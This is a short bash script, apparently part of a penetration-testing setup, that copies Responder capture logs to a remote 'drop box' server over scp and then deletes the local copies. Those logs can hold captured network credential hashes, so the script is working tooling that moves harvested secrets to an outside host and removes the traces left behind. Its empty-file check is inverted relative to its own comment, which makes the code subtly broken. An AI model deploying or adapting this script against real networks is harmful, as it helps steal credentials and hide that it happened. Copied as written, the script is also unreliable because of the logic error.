#!/bin/bash

## Script to copy logs to our pentesty drop box

# Configuration settings are stored here:
source /home/ubuntu/scripts/pentest-config.sh


# Where to get the responder logs:
LOGDIR=/pentest/exploitation/responder/logs/

case $1 in
    start)
        echo $$ > $RUNDIR/cplogs.pid
        for file in $(ls -1 $LOGDIR)
            do
                                         # Don't bother if the file is empty
            if [ ! -s "$LOGDIR$file" ]
            then
                scp $LOGDIR$file $HOME_USER@$HOME_SERVER:$HOME_PATH`echo $(TZ=America/New_York date +"%Y-%m-%d-%H%M")`-$file && rm -f $LOGDIR$file
            fi
        done
    ;;
    stop)
        kill `cat $RUNDIR/cplogs.pid` 
    ;;
    *)
        echo "usage: cplogs.sh {start|stop}" 
    ;;
esac
exit 0
